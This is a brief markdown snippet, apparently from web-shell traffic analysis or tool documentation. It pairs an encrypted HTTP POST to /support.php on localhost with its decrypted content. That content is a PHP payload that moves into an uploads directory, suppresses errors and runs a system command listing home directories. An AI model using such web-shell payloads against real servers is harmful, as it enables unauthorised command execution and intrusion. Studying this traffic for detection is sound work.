## Encrypted

```
POST /support.php HTTP/1.1
Accept-Encoding: identity
Content-Length: 172
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Connection: close
User-Agent: Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.1.4) Gecko/20070704 Firefox/2.0.0.4

3Qve>.IXeOLC>[D&6f8af44abea0QKxo+HM4thMoMKWcSng9UZNbdc4WFhO2jaU4eMhPaDTePEuB48JstWIb4aEirLpXpdgb7g8Bx/IGI/JLbVRcFack+r90YxXpmBA1wQKaU9jeRhvp7imF351039f4a7b5+'Qn/?>-
e=ZU mx
```

## Decrypted

```
HTTP/1.1 200 OK
Host: 127.0.0.1
Date: Thu, 24 Jun 2021 07:33:43 GMT
Connection: close
X-Powered-By: PHP/8.0.7
Content-type: text/html; charset=UTF-8

chdir('/var/www/html/uploads');@error_reporting(0);@system('ls -lah /home/* 2>&1');
```